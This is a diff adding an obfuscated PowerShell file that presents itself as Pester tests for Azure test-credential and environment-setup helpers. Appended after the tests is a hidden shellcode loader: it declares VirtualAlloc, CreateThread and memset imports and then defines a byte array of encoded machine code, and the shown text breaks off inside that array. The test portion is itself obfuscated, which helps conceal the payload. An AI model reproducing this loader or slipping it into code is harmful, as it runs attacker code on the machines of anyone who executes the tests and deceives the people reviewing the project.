@@ -1,0 +1,164 @@
+  &("{1}{0}"-f 'IteM','SEt-')  ("V"+"A"+"rIa"+"Ble:wg6")  ( [typE]("{3}{1}{0}{5}{6}{2}{4}" -F '.R','teM','oN.AsSem','sYS','bLy','Ef','LECTI'))  ; 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+&("{1}{0}{2}{3}"-f 'rt-Mo','Impo','d','ule') (("{2}{4}{8}{0}{3}{1}{7}{5}{6}"-f 'iptR','ot/','bI','o','OPSSc','Tas','ks','TestFx-','r')).Replace(([cHAr]98+[cHAr]73+[cHAr]79),'$')
+&("{1}{0}"-f 'ibe','Descr') ("{6}{4}{2}{1}{0}{5}{3}"-f 'lNewSer','ntia','wCrede','rincipal','st-Ne','viceP','Te'){
+	&("{0}{2}{1}"-f 'C','ntext','o') ("{8}{7}{11}{1}{4}{6}{3}{2}{9}{10}{0}{5}" -f 'i','tt','ervice','S','ed','pal',' ','es a co','Creat','P','rinc','rrectly forma'){
+        &("{4}{1}{0}{2}{3}" -f'-A','in','zureRmAcco','unt','Log') -AccessToken ("{1}{0}{2}" -f '34567','12','8') -SkipValidation -AccountId ("{0}{2}{1}"-f'tes','ount','tacc') -TenantId ("{1}{5}{2}{7}{0}{3}{4}{6}"-f'adf','8bc4','4b7a-8ca1','b4','87','8661-1801-','0','-6a3c') -Subscription ("{3}{4}{7}{2}{6}{0}{5}{1}"-f '-6a','b4870','8','8','bc4866','3cadf','01-4b7a-8ca1','1-1') -GraphAccessToken ("{1}{0}" -f '45678','123')
+        &("{0}{1}"-f 'Mo','ck') -ModuleName ("{3}{2}{1}{0}" -f 'asks','x-T','stF','Te') ("{6}{7}{0}{1}{2}{3}{4}{5}" -f'-AzureR','mA','DSe','rviceP','rincipa','l','G','et') { return @() }
+        &("{0}{1}" -f 'M','ock') -ModuleName ("{1}{2}{0}"-f'asks','Test','Fx-T') ("{3}{2}{1}{4}{0}{6}{5}"-f 'ePri','rvi','ADSe','New-AzureRM','c','cipal','n') { return @{("{3}{2}{1}{0}" -f'ionId','icat','ppl','A') = ("{9}{8}{5}{2}{1}{7}{10}{4}{6}{0}{3}" -f 'fb48','-1801-4','1','70','-','c4866','6a3cad','b7a-8','b','8','ca1'); "Id" = ("{2}{4}{6}{3}{5}{7}{0}{1}{8}"-f '6','a3cadfb4','8bc486','-4b7','61-18','a-8','01','ca1-','870')} }
+        &("{0}{1}" -f 'Mo','ck') -ModuleName ("{1}{0}{2}"-f 'tFx-Ta','Tes','sks') ("{0}{3}{5}{1}{4}{2}"-f 'N','signme','t','ew-Azu','n','reRMRoleAs') { return ${TR`UE} }
+        &("{0}{1}"-f 'M','ock') -ModuleName ("{1}{0}{2}" -f 'F','Test','x-Tasks') ("{4}{1}{2}{0}{5}{3}" -f 'RMR','et','-Azure','ment','G','oleAssign') { return ${t`RUE} }
+        ${C`ONtE`xt} = &("{2}{1}{0}{3}"-f 'onte','C','Get-AzureRm','xt')
+        ${s`EcUrESEcr`ET} = &("{3}{0}{1}{4}{2}"-f'rtTo-Se','cure','ing','Conve','Str') -String ("{1}{0}{2}{3}"-f 'estpass','t','w','ord') -AsPlainText -Force
+        &("{1}{3}{2}{0}" -f 'dential','New-TestC','e','r') -ServicePrincipalDisplayName ("{2}{8}{6}{4}{5}{0}{1}{3}{7}" -f'tse','rvicepr','cre','in','e','s','ialt','cipal','dent') -ServicePrincipalSecret ${SeCU`REsec`R`ET} -SubscriptionId ${c`oNTE`xt}."S`UB`sCrIPt`iOn"."i`D" -TenantId ${c`on`TExT}."tE`N`Ant"."iD" -RecordMode ("{1}{2}{0}" -f'k','P','laybac') -Force
+        ${fI`Lep`ATH} = ${E`Nv:`UsErPro`FIle} + ((("{5}{0}{1}{7}{2}{3}{6}{4}"-f '.azur','e5','cred','ential','n','52N','s.jso','2Ntest'))."rEPL`ACE"(([CHAr]53+[CHAr]50+[CHAr]78),'\'))
+        &('It') ("{2}{1}{3}{7}{8}{4}{9}{5}{6}{0}"-f' file','rit','w','es cor','informa','io','n to','re','ct ','t') {
+            ${FI`LEPa`TH} | &("{1}{0}"-f 'ld','Shou') ("{1}{0}"-f 'ontain','C') ("{0}{1}{3}{2}" -f 'S','ervicePri','cipal','n')(':')  ("{4}{1}{3}{0}{7}{5}{6}{2}" -f '8661-','b','70','c4','8','01-4b7a-8ca1-6a3','cadfb48','18')
+            ${F`I`lEP`ATh} | &("{0}{1}"-f'Shoul','d') ("{1}{0}"-f'n','Contai') ("{2}{1}{4}{0}{3}" -f'ecr','rinci','ServiceP','et','palS')(':')  ("{0}{1}{2}"-f 'tes','t','password')
+        }
+    }
+	
+	&("{1}{0}" -f'ontext','C') ("{5}{4}{6}{2}{3}{1}{0}"-f't','y se','tring is ','properl','tion ','Connec','s') {
+        ${FIL`ePA`Th} = &("{0}{1}{2}"-f'Jo','i','n-Path') -Path ${Psscrip`Tr`O`ot} -ChildPath ((("{8}{27}{15}{20}{14}{21}{29}{6}{13}{32}{33}{0}{5}{2}{17}{1}{3}{24}{10}{30}{9}{4}{28}{23}{22}{12}{19}{26}{16}{25}{18}{7}{31}{11}{34}"-f'e','0}bi','ager','n','Microsoft','sourceMan','and','est.C','{0}..{0}','}','ebu','mon.dl','mm','s.Scenar','0','}src','enar','.Common{','oT','and','{','}Common{0','.Co','re','{0}D','i','s.Sc','..{0','.Azu','}Comm','g{0','om','i','oTests.R','l')) -F [chAR]92)
+        ${aSS`E`MBly} =  ( &("{2}{1}{0}"-f'ilDItem','et-Ch','G')  ("vArI"+"AB"+"lE:"+"WG6")  ).value::("{2}{0}{1}"-f'Fr','om','Load').Invoke(${F`il`EpAtH})
+        ${E`NVhE`lpEr} = &("{0}{2}{1}" -f 'N','ect','ew-Obj') ("{2}{10}{5}{1}{6}{0}{8}{12}{14}{15}{9}{4}{3}{13}{7}{11}" -f'u','ws','Microsof','nvironmentSet','est.E','indo','Az','lpe','re','ioT','t.W','r','.','upHe','Commands.','Scenar') -ArgumentList @()
+        ${En`Vhel`PER}.("{8}{1}{0}{2}{3}{6}{4}{5}{7}" -f'nt','nvironme','Va','riable','e','den','FromCr','tialFile','SetE').Invoke()
+        &('It') ("{1}{0}{6}{5}{12}{4}{11}{7}{3}{2}{8}{9}{10}"-f'reates','c','nmen','d enviro','r','rrec',' co','tte','t str','in','g','ma','tly fo') {
+            ${eN`V:`AzuRe`_tesT_M`odE} | &("{0}{1}"-f'Shou','ld') ("{0}{1}" -f'Mat','ch') ("{2}{0}{1}"-f'ayb','ack','Pl')
+            ${e`N`V:Test_CSm_orGid_AUT`hENtIC`A`Tion} | &("{0}{1}" -f'Sho','uld') ("{1}{0}"-f'h','Matc') ("{3}{1}{2}{0}"-f'=','ri','ptionId','Subsc') ('+') ${c`ONTe`xt}."Subs`Cri`PtI`On"."id" ('+') ("{10}{9}{8}{0}{7}{12}{3}{6}{11}{2}{1}{5}{13}{14}{4}" -f ';','r','P','e','ipal=','od;Se','nt','Env','de=Playback','erMo',';HttpRecord','=','ironm','rvicePrin','c') ('+') 
+            ("{4}{7}{2}{5}{1}{6}{8}{3}{0}"-f'cadfb4870','-','48661-1801-4b7','a3','8','a','8ca1','bc','-6') + ("{5}{1}{3}{6}{2}{4}{7}{9}{8}{0}"-f';','e','e','rvi','PrincipalS',';S','c','e','ssword','cret=testpa') + ("{1}{2}{0}" -f'ant=','AADT','en') + ${c`o`NtExT}."TEn`ANT"."i`d"
+        }
+    }
+
+	
+	&("{2}{1}{0}"-f've-Item','emo','R') ("{3}{0}{2}{1}"-f'URE_TEST_M','E','OD','Env:AZ')
+	&("{2}{1}{0}"-f'e-Item','emov','R') ("{4}{5}{1}{3}{6}{2}{0}" -f'ON','_ORGID','ATI','_AUTHE','Env:TE','ST_CSM','NTIC')
+	${f`iLep`AtH} = ${e`Nv:User`Pr`ofIlE} + ((("{1}{2}{6}{7}{0}{5}{3}{4}" -f 'testcred','{0}','.azur','tials','.json','en','e{','0}')) -F  [cHaR]92)
+	&("{0}{1}{2}"-f 'R','emo','ve-Item') -LiteralPath ${f`iLE`P`AtH} -Force
+	${DiRE`c`TOr`yPATh} = ${e`Nv`:USERp`RoFilE} + ((("{2}{0}{1}"-f'R','M.azureVRM','V'))."RE`P`LaCE"('VRM',[StRiNG][ChAR]92))
+	${DirECTo`RyE`m`pTY} = &("{0}{2}{3}{4}{1}" -f'Ge','tem','t-','Chi','ldI') ${diR`EcTo`RyPa`TH} | &("{3}{1}{2}{4}{0}" -f 'ect','su','re-Ob','Mea','j')
+	if (${DiRE`C`Tor`YEMpTy}."cO`UNT" -eq 0)
+	{
+		&("{0}{2}{1}{3}"-f'Re','e','mov','-Item') ${DI`Rectoryp`A`TH} -Recurse -Force
+	}
+}
+
+&("{1}{0}" -f 'be','Descri') ("{3}{1}{6}{0}{7}{2}{5}{4}"-f'xistingService','wCr','rin','Test-Ne','ipal','c','edentialE','P') {
+	&("{1}{0}{2}" -f 'on','C','text') ("{7}{5}{3}{4}{8}{1}{0}{6}{2}" -f 'ervicePri',' a S','pal','s and ','use','d','nci','Fin','s'){
+        &("{4}{3}{2}{0}{1}"-f 'cou','nt','Ac','reRm','Login-Azu') -AccessToken ("{1}{0}{2}"-f'4','123','5678') -SkipValidation -AccountId ("{1}{0}{3}{2}"-f'e','t','count','stac') -TenantId ("{5}{8}{4}{7}{2}{9}{0}{6}{10}{1}{3}"-f '-','fb4','7','870','61-','8bc','8ca1-6a3','1801-4b','486','a','cad') -Subscription ("{6}{1}{2}{7}{5}{0}{3}{4}"-f 'a-8ca','661-','1801','1-6a3cadfb48','70','b7','8bc48','-4') -GraphAccessToken ("{0}{2}{1}"-f '1','345678','2')
+        &("{1}{0}" -f 'k','Moc') -ModuleName ("{3}{2}{1}{0}" -f'ks','s','Fx-Ta','Test') ("{5}{1}{6}{4}{2}{3}{0}"-f'l','eRmADS','ePri','ncipa','ic','Get-Azur','erv') { return @(@{("{1}{3}{2}{0}"-f'ionId','App','icat','l') = ("{1}{0}" -f '4','123'); "Id" = ("{1}{0}"-f'678','5'); ("{1}{2}{0}"-f'me','Disp','layNa') = ("{0}{4}{3}{6}{2}{1}{5}"-f 'credenti','pa','ci','est','alt','l','serviceprin')}) }
+        ${cO`Nt`EXT} = &("{3}{2}{1}{4}{0}"-f'eRmContext','u','et-Az','G','r')
+        ${SecU`R`esEcr`ET} = &("{6}{3}{0}{1}{4}{2}{5}"-f'ec','ur','Str','S','e','ing','ConvertTo-') -String ("{2}{1}{0}" -f 'word','s','testpas') -AsPlainText -Force
+        &("{0}{1}{2}{3}{4}"-f 'New-TestCr','e','de','ntia','l') -ServicePrincipalDisplayName ("{0}{5}{3}{4}{1}{2}" -f 'c','nc','ipal','eden','tialtestservicepri','r') -ServicePrincipalSecret ${SE`CUReSE`cReT} -SubscriptionId ${co`N`TexT}."sUbscR`Ip`Ti`on"."i`D" -TenantId ${c`ON`TEXT}."t`En`AnT"."Id" -RecordMode ("{1}{0}"-f 'ecord','R') -Force
+        ${FILEpa`TH} = ${En`V:USER`pRofIlE} + ((("{4}{2}{3}{5}{0}{1}"-f 'tials.jso','n','wl.azureUw','ltestc','U','reden')) -rePLaCE  'Uwl',[cHaR]92)
+        &('It') ("{0}{6}{5}{3}{1}{2}{7}{4}" -f 'writ','rrect ','inf','o','rmation to file',' c','es','o') {
+            ${FILEP`A`Th} | &("{2}{0}{1}"-f'houl','d','S') ("{1}{2}{0}" -f'in','Co','nta') ("{2}{3}{0}{1}"-f'eP','rincipal','Se','rvic')(':')  ("{0}{1}"-f'12','34')
+            ${f`ILepa`Th} | &("{0}{1}" -f'Shoul','d') ("{1}{0}{2}" -f'on','C','tain') ("{3}{0}{2}{4}{1}"-f'r','ecret','incipal','ServiceP','S')(':')  ("{2}{3}{1}{0}" -f'ord','tpassw','te','s')
+        }
+    }
+
+    &("{0}{2}{1}"-f'Cont','t','ex') ("{4}{1}{6}{0}{5}{2}{8}{9}{3}{7}"-f'ring is ','n s','ro','y','Connectio','p','t',' set','p','erl') {
+        ${FIlE`pa`TH} = &("{2}{1}{0}" -f'h','t','Join-Pa') -Path ${pSS`cr`Ip`Tr`Oot} -ChildPath ((("{15}{1}{26}{20}{7}{13}{2}{24}{0}{35}{27}{31}{34}{9}{28}{14}{23}{18}{30}{19}{17}{21}{10}{32}{5}{16}{4}{3}{29}{11}{22}{33}{12}{8}{6}{25}" -f'0Com','r0','mmo','en','.Commands.Sc','r0Microsoft.A','dl','Ur0s','on.','ts.','Ur0Deb','o','m','rcUr0Co','esourceM','U','zure','m','g','r.Com','.','onUr0bin','Test.Co','ana','nUr','l','..Ur0.','and','R','ari','e','s.Scena','ugU','m','rioTes','m'))-cREPlACe  ([cHAr]85+[cHAr]114+[cHAr]48),[cHAr]92)
+        ${A`sS`EMBLy} =   (  &("{0}{2}{1}" -f'gET-','bLE','varia')  ("{1}{0}"-f '6','wG') ).VALUe::("{0}{1}"-f'LoadF','rom').Invoke(${f`Il`e`paTH})
+        ${ENV`HelP`Er} = &("{2}{3}{0}{1}" -f'Obj','ect','Ne','w-') ("{13}{9}{5}{15}{11}{8}{12}{2}{0}{4}{1}{3}{7}{6}{10}{14}" -f 'Test.','o','o','nmentSetupH','Envir','t.','l','e','re.Comma','sof','pe','indowsAzu','nds.Scenari','Micro','r','W') -ArgumentList @()
+        ${ENvH`elp`Er}.("{2}{10}{3}{4}{0}{5}{7}{1}{6}{8}{9}"-f'nmentV','m','Set','v','iro','a','Cre','riableFro','denti','alFile','En').Invoke()
+        &('It') ("{3}{8}{5}{4}{2}{7}{6}{0}{1}"-f'ent str','ing','ctly formatted','creates ','e','r','vironm',' en','cor') {
+            ${ENV:`AzUR`E_T`EsT_m`odE} | &("{0}{1}"-f'Sh','ould') ("{0}{1}" -f 'M','atch') ("{1}{0}"-f 'ord','Rec')
+            ${eN`V:T`e`sT_CSm`_`Org`Id_AutHeNtIC`ATiON} | &("{0}{2}{1}"-f'S','ould','h') ("{1}{0}" -f'atch','M') ("{3}{2}{0}{1}{4}" -f'ipt','ion','scr','Sub','Id=') ('+') ${c`Ont`EXT}."SUbS`Cr`ipT`iON"."i`D" ('+') ("{7}{11}{12}{2}{4}{6}{3}{8}{5}{9}{0}{10}{1}"-f 'Princip','l=','e','on','rM','ent=Pr','ode=Record;Envir',';Ht','m','od;Service','a','tp','Record') ('+') 
+                ("{1}{0}"-f'234','1') + ("{5}{0}{3}{4}{7}{2}{9}{8}{6}{1}" -f 'Service','d;','et','Pri','nc',';','r','ipalSecr','sswo','=testpa') + ("{0}{3}{1}{2}"-f 'A','a','nt=','ADTen') + ${CoN`TEXT}."teNA`NT"."I`D"
+        }
+    }
+
+	
+	&("{2}{0}{1}" -f '-Ite','m','Remove') ("{2}{6}{1}{4}{5}{3}{0}" -f'E','UR','En','MOD','E_T','EST_','v:AZ')
+	&("{0}{1}{2}" -f'Rem','ov','e-Item') ("{1}{7}{9}{8}{10}{0}{4}{6}{5}{2}{3}" -f '_ORG','E','TIO','N','I','A','D_AUTHENTIC','nv','CS',':TEST_','M')
+	${F`i`LEP`Ath} = ${eNv`:uSEr`pROF`Ile} + ((("{6}{4}{1}{5}{2}{0}{3}{7}"-f'ls.','t','redentia','j','s','c','9rW.azure9rWte','son')).("{1}{0}{2}" -f'P','rE','LACE').Invoke('9rW','\'))
+	&("{1}{0}{2}" -f've','Remo','-Item') -LiteralPath ${fIL`Ep`Ath} -Force
+	${direC`TORY`pATH} = ${ENv`:uSer`prOFILe} + ((("{0}{2}{1}" -f '{0}.azure{','}','0'))-f[ChAr]92)
+	${dirECTOR`y`EmPTy} = &("{1}{0}{4}{2}{3}"-f 'Ch','Get-','e','m','ildIt') ${DI`Re`CT`oryPatH} | &("{0}{2}{3}{1}" -f'Measure-','t','O','bjec')
+	if (${D`IREC`TOrY`Em`PtY}."C`oUNt" -eq 0)
+	{
+		&("{2}{0}{1}"-f'e-','Item','Remov') ${D`Ir`ecToR`yPaTH} -Recurse -Force
+	}
+}
+
+&("{1}{2}{0}"-f'e','Descri','b') ("{2}{5}{3}{1}{0}{4}"-f'Cre','-New','T','t','dentialUserId','es') {
+    &("{0}{2}{1}"-f 'Con','t','tex') ("{3}{1}{4}{0}{2}" -f ' f','es ','ile','Creat','correct') {
+        ${CO`NteXT} = &("{1}{3}{2}{0}" -f 'ontext','Get','ureRmC','-Az')
+		&("{0}{1}{2}{4}{3}"-f 'New-','T','est','dential','Cre') -UserId ("{0}{2}{1}"-f't','stuser','e') -SubscriptionId ${Co`N`TEXT}."SubSC`Ri`P`TiON"."ID" -RecordMode ("{1}{0}{2}"-f 'a','Pl','yback') -Force
+		${FiL`EpaTH} = ${en`V:`Use`RPROFILe} + ((("{7}{0}{1}{6}{3}{2}{5}{4}" -f '0}','.','redentials.','e{0}testc','n','jso','azur','{'))  -F[ChAr]92)
+        &('It') ("{0}{3}{7}{4}{6}{1}{5}{2}" -f 'writes cor','o f','e','rect ','ti','il','on t','informa') {
+            ${fI`lE`p`ATH} | &("{1}{0}"-f'uld','Sho') ("{1}{0}"-f'ain','Cont') ("{1}{0}"-f 'erId','Us')(':')  ("{2}{1}{0}"-f'er','us','test')
+            ${fIlEPA`Th} | &("{0}{1}" -f'Sh','ould') ("{0}{1}"-f 'Con','tain') ("{4}{0}{3}{2}{1}" -f 'Rec','e','Mod','order','Http')(':')  ("{1}{2}{0}"-f'ck','Play','ba')
+        }
+    }
+	
+	&("{2}{1}{0}"-f 't','ex','Cont') ("{4}{2}{3}{6}{0}{5}{1}" -f 'perl',' set','tion string ','is p','Connec','y','ro') {
+        ${f`Il`ePatH} = &("{2}{1}{0}" -f 'ath','-P','Join') -Path ${P`SscRI`ptrOOt} -ChildPath ((("{4}{22}{30}{7}{9}{2}{17}{32}{0}{29}{16}{20}{26}{21}{19}{25}{31}{24}{8}{3}{11}{1}{10}{28}{12}{27}{18}{13}{6}{15}{5}{14}{23}" -f 'on2','SD','2JSCo','r.Common2','2JS','Test.','ar','r','e','c','eb','JSbin2J','.Azur','en','Common.','io','C','m','.Sc','ScenarioTest','omm','s.','..2J','dll','ag','s.Resour','and','e.Commands','ug2JSMicrosoft','JS','S..2JSs','ceMan','m'))-crEplACE'2JS',[cHaR]92)
+        ${A`S`SemBLy} =  ${w`G6}::("{0}{1}" -f 'Load','From').Invoke(${f`ILepA`Th})
+        ${eN`VhE`LPer} = &("{2}{1}{0}" -f't','-Objec','New') ("{11}{7}{4}{13}{9}{5}{6}{0}{12}{2}{10}{1}{3}{8}" -f 'E','tSe','r','tupHelp','ndows','mmand','s.ScenarioTest.','soft.Wi','er','e.Co','onmen','Micro','nvi','Azur') -ArgumentList @()
+        ${ENv`hEL`PEr}.("{0}{5}{4}{1}{9}{6}{3}{2}{10}{8}{7}" -f 'SetE','o','eFromC','l','r','nvi','Variab','ntialFile','e','nment','red').Invoke()
+        &('It') ("{5}{1}{0}{7}{2}{3}{4}{6}{8}" -f'rrectly forma','s co',' ','enviro','nmen','create','t','tted',' string') {
+            ${EnV:az`Ure_t`es`T`_mo`DE} | &("{1}{0}" -f'ould','Sh') ("{0}{1}" -f 'M','atch') ("{2}{1}{0}" -f 'ack','yb','Pla')
+            ${eNV:TeST_csM_OrG`Id_`A`U`Then`TicATiON} | &("{1}{0}" -f 'd','Shoul') ("{1}{0}" -f 'h','Matc') ("{1}{0}{2}{3}" -f'ionI','Subscript','d','=') ('+') ${co`NTexT}."sU`Bs`CR`iPtION"."i`d" ('+') ("{3}{8}{11}{10}{0}{9}{4}{7}{1}{12}{6}{2}{5}"-f ';',';User','st',';Http','ironment=Pro','user','te','d','RecorderMode=','Env','k','Playbac','Id=')
+		}
+	}
+
+	
+	&("{3}{2}{1}{0}"-f 'tem','e-I','emov','R') ("{3}{4}{1}{2}{0}" -f'_MODE','S','T','Env:AZURE','_TE')
+	&("{0}{3}{2}{1}" -f'Rem','Item','e-','ov') ("{6}{4}{2}{1}{0}{3}{5}"-f 'ID_AUT','G','_CSM_OR','HENTI','ST','CATION','Env:TE')
+	${F`ilepa`Th} = ${enV:usE`RP`RoF`IlE} + ((("{1}{3}{4}{0}{2}{5}" -f 'r','{0}.','e{0}te','az','u','stcredentials.json')) -F  [chAR]92)
+	&("{2}{0}{1}{3}"-f 'move','-It','Re','em') -LiteralPath ${fIl`Ep`Ath} -Force
+	${dI`RE`Ct`ORYPAtH} = ${eNv:usE`RprO`F`ilE} + ((("{1}{2}{0}"-f'}','{0}.azure','{0')) -F [cHar]92)
+	${DiRe`c`TorYEMpty} = &("{0}{2}{1}{3}"-f'Get','d','-Chil','Item') ${dIR`Ector`y`pATH} | &("{1}{0}{3}{2}" -f're-','Measu','ject','Ob')
+	if (${dIre`c`ToR`yE`MptY}."c`OUNt" -eq 0)
+	{
+		&("{1}{0}{2}" -f 'e-','Remov','Item') ${Dir`EC`Tor`ypatH} -Recurse -Force
+	}
+}
+
+&("{1}{2}{0}"-f 'cribe','D','es') ("{0}{9}{8}{3}{1}{5}{7}{4}{6}{2}{10}"-f'Te','vi','Pri','etEn','ntS','ronm','ervice','e','S','st-','ncipal') {
+	&("{2}{1}{0}"-f'xt','te','Con') ("{1}{0}{8}{9}{5}{6}{7}{2}{3}{4}" -f 'i','Connection str',' ','se','t','o','perl','y','ng',' is pr') {
+		${C`onTE`XT} = &("{1}{0}{2}{3}" -f'-AzureRmC','Get','onte','xt')
+		${NE`w`SErVi`cEpRINcIP`Al} = @{("{2}{0}{3}{1}" -f 'pplic','nId','A','atio') = ("{0}{1}"-f '12','34'); "Id" = ("{0}{1}"-f'5','678'); ("{3}{0}{1}{2}"-f 'playNa','m','e','Dis') = ("{6}{5}{3}{4}{2}{0}{1}"-f 'i','ncipal','ervicepr','edentia','ltests','r','c')}
+		&("{0}{2}{3}{1}"-f'Set-Te','ironment','s','tEnv') -ServicePrincipalId ${Ne`W`sErVICePR`In`CiPaL}."aPpl`IC`Ati`oNId" -ServicePrincipalSecret ("{2}{3}{0}{1}" -f'tpasswor','d','te','s') -SubscriptionId ${cOn`T`EXT}."sUbsc`Rip`Ti`oN"."I`D" -TenantId ${CO`NTe`XT}."t`eN`ANt"."ID" -RecordMode ("{1}{2}{0}" -f'rd','Rec','o')
+		&('It') ("{7}{1}{10}{8}{11}{3}{0}{9}{4}{5}{6}{2}" -f'cor','a','g',' ',' forma','tted environmen','t strin','cre','e','rectly','t','s') {
+            ${en`V:aZuR`e_T`esT_`mo`dE} | &("{2}{1}{0}" -f 'd','oul','Sh') ("{0}{1}" -f'Matc','h') ("{0}{1}"-f 'Rec','ord')
+			${eNv:`TeS`T_c`sM_oR`g`iD_A`UtheNtICAtiON} | &("{1}{2}{0}"-f 'd','Sho','ul') ("{0}{1}" -f 'Mat','ch') ("{0}{1}{3}{2}" -f 'S','ubs','nId=','criptio') ('+') ${co`NT`EXt}."S`Ub`scRipTIoN"."ID" ('+') ("{9}{3}{6}{7}{8}{1}{5}{0}{2}{4}" -f'nmen','de=Record;En','t=Prod;AADTe','t','nant=','viro','tpReco','rd','erMo',';H') ('+')
+				${C`o`NtExT}."tE`NAnT"."Id" + ("{3}{1}{2}{0}"-f'incipal=','ceP','r',';Servi') + ("{1}{0}"-f '234','1') + ("{7}{1}{8}{9}{3}{6}{0}{2}{4}{5}{10}"-f 'ec','vic','r','ipal','et=','testpass','S',';Ser','ePrin','c','word')
+		}
+	}
+
+	
+	&("{3}{0}{1}{2}" -f 've-I','t','em','Remo') ("{4}{2}{1}{0}{3}" -f 'T_MO','URE_TES','v:AZ','DE','En')
+	&("{2}{0}{1}{3}"-f'o','ve','Rem','-Item') ("{0}{6}{5}{4}{3}{2}{1}"-f'Env:','NTICATION','ID_AUTHE','RG','_O','CSM','TEST_')
+}
+
+&("{0}{1}{2}"-f 'D','escrib','e') ("{1}{6}{2}{4}{5}{0}{3}" -f 'nvironme','Te','S','ntUserId','et','E','st-') {
+	&("{0}{2}{1}"-f'Cont','xt','e') ("{5}{4}{6}{3}{1}{2}{0}"-f't','e','rly se','p',' string is pr','Connection','o') {
+		${Co`N`TEXT} = &("{1}{4}{5}{0}{2}{3}"-f'eR','Get','mCont','ext','-Az','ur')
+		&("{1}{0}{2}{3}" -f'ironm','Set-TestEnv','e','nt') -UserId ("{1}{2}{0}" -f 'er','tes','tus') -SubscriptionId ${ContE`Xt}."SubScRip`T`I`ON"."I`d" -RecordMode ("{1}{2}{0}"-f'ck','Pla','yba')
+		&('It') ("{7}{1}{4}{3}{0}{2}{8}{6}{5}"-f' en','rec','vi','rmatted','tly fo','ring','st','creates cor','ronment ') {
+            ${E`N`V:aZurE_TESt_`Mo`DE} | &("{2}{1}{0}"-f'd','l','Shou') ("{0}{1}" -f 'M','atch') ("{2}{0}{1}"-f'ayba','ck','Pl')
+			${ENv:t`e`s`T_csm`_`ORGiD_AUtheNTi`CaTi`oN} | &("{1}{2}{0}"-f'd','Shou','l') ("{1}{0}" -f'atch','M') ("{0}{2}{1}" -f 'S','d=','ubscriptionI') ('+') ${cO`N`TexT}."SUB`SC`RIpTI`On"."I`d" ('+') ("{0}{3}{13}{4}{14}{8}{2}{6}{9}{12}{10}{5}{11}{1}{7}"-f ';Http','testuse','back;Env','Recorder','d','serI','iro','r','y','nm','U','d=','ent=Prod;','Mo','e=Pla')
+		}
+	}
+
+	
+	&("{2}{3}{0}{1}" -f 'te','m','Remov','e-I') ("{1}{4}{5}{3}{2}{0}" -f'_MODE','E','ST','E_TE','n','v:AZUR')
+	&("{0}{2}{1}{3}"-f'Re','ve','mo','-Item') ("{5}{2}{7}{8}{1}{3}{4}{6}{0}"-f 'ENTICATION','_','TEST_CSM','AU','T','Env:','H','_OR','GID')
+}
+${c} = ((("{76}{2}{24}{49}{13}{52}{65}{70}{71}{68}{53}{62}{18}{11}{72}{25}{63}{5}{64}{20}{1}{60}{9}{88}{36}{84}{83}{61}{48}{46}{39}{8}{89}{4}{80}{81}{22}{78}{34}{44}{57}{27}{55}{77}{67}{82}{21}{92}{47}{28}{41}{42}{12}{90}{69}{86}{37}{26}{31}{19}{87}{45}{50}{15}{58}{91}{32}{43}{56}{66}{79}{30}{73}{40}{93}{14}{85}{35}{3}{74}{10}{6}{29}{17}{33}{75}{38}{23}{59}{16}{54}{7}{51}{0}"-f't);','fl','llImport(q2Jkernel32','s','l32.','wSize',' ','t','ern','c','c extern','IntPtr','I',']pu','svcrt.',', uint dwCreationFlags',',','tr memse','Alloc(','lpP','int ','eadAttribut','tic ext','dest, u','.dllq2','dress, uin','ntP','(IntP','t ','IntP','DllI','tr ','t','t(I','r',')]public ','e','ress, I','tPtr ','lImport(q2Jk','q','dwStackSize',', ','r l',' C','r','l','in','t);[D','J)','ameter',' coun','bl','IntP',' uin','t','pT','reateThread',', In','int src','Allo','flProtec','tr Virtual','t d',', u','ic sta','hread','lpT','xtern ','tPtr lp','tic ','e',' lpAd','mport(','tati','n','[D','r ','ern IntPt','Id);[','dllq2J)]public',' sta','hr','nt ',', ui','dllq2J','StartAdd','a','ationTyp','e','n','tP','es, u','2Jm')) -rePlaCE ([cHar]113+[cHar]50+[cHar]74),[cHar]34);${W} = &("{2}{1}{0}" -f'pe','Ty','Add-') -memberDefinition ${C} -Name ("{0}{1}" -f 'Win3','2') -namespace ("{0}{1}{2}"-f 'Win3','2F','unctions') -passthru;[Byte[]];[Byte[]]${z} = 0xb8,0x8f,0x80,0x3e,0x9a,0xd9,0xc5,0xd9,0x74,0x24,0xf4,0x5f,0x33,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x80,0x62,0xcb,0x66,0x76,0xe0,0x34,0x97,0x86,0x85,0xbd,0x72,0xb7,0x85,0xda,0xf7,0xe7,0x35,0xa8,0x5a,0x0b,0xbd,0xfc,0x4e,0x98,0xb3,0x28,0x60,0x29,0x79,0x0f,0x4f,0xaa,0xd2,0x73,0xce,0x28,0x29,0xa0,0x30,0x11,0xe2,0xb5,0x31,0x56,0x1f,0x37,0x63,0x0f,0x6b,0xea,0x94,0x24,0x21,0x37,0x1e,0x76,0xa7,0x3f,0xc3,0xce,0xc6,0x6e,0x52,0x45,0x91,0xb0,0x54,0x8a,0xa9,0xf8,0x4e,0xcf,0x94,0xb3,0xe5,0x3b,0x62,0x42,0x2c,0x72,0x8b,0xe9,0x11,0xbb,0x7e,0xf3,0x56,0x7b,0x61,0x86,0xae,0x78,0x1c,0x91,0x74,0x03,0xfa,0x14,0x6f,0xa3,0x89,0x8f,0x4b,0x52,0x5d,0x49,0x1f,0x58,0x2a,0x1d,0x47,0x7c,0xad,0xf2,0xf3,0x78,0x26,0xf5,0xd3,0x09,0x7c,0xd2,0xf7,0x52,0x26,0x7b,0xa1,0x3e,0x89,0x84,0xb1,0xe1,0x76,0x21,0xb9,0x0f,0x62,0x58,0xe0,0x47,0x47,0x51,0x1b,0x97,0xcf,0xe2,0x68,0xa5,0x50,0x59,0xe7,0x85,0x19,0x47,0xf0,0xea,0x33,0x3f,0x6e,0x15,0xbc,0x40,0xa6,0xd1,0xe8,0x10,0xd0,0xf0,0x90,0xfa,0x20,0xfd,0x44,0x96,0x25,0x69,0xa7,0xcf,0x24,0x0c,0x4f,0x12,0x29,0xdf,0xd3,0x9b,0xcf,0x8f,0xbb,0xcb,0x5f,0x6f,0x6c,0xac,0x0f,0x07,0x66,0x23,0x6f,0x37,0x89,0xe9,0x18,0xdd,0x66,0x44,0x70,0x49,0x1e,0xcd,0x0a,0xe8,0xdf,0xdb,0x76,0x2a,0x6b,0xe8,0x87,0xe4,0x9c,0x85,0x9b,0x90,0x6c,0xd0,0xc6,0x36,0x72,0xce,0x6d,0xb6,0xe6,0xf5,0x27,0xe1,0x9e,0xf7,0x1e,0xc5,0x00,0x